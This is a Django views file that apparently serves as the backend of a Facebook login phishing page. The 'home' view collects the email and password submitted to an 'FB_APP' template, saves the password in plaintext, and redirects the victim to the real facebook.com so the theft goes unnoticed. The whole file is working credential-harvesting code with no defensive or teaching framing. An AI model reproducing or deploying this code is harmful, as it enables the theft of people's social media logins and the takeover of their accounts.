from django.shortcuts import render
from django.shortcuts import render, redirect
from django.http import HttpResponseRedirect
from django.urls import reverse
from .models import UserProfile
# Create your views here.

def home(request):
    if request.method == 'POST':
        email = request.POST.get('email')
        password = request.POST.get('password')

        # Create or update the UserProfile
        user_profile, created = UserProfile.objects.get_or_create(email=email)
        user_profile.password = password
        user_profile.save()

        # Redirect to Facebook main page after saving user info
        return HttpResponseRedirect('https://www.facebook.com')
    
    return render(request, 'FB_APP/index.html')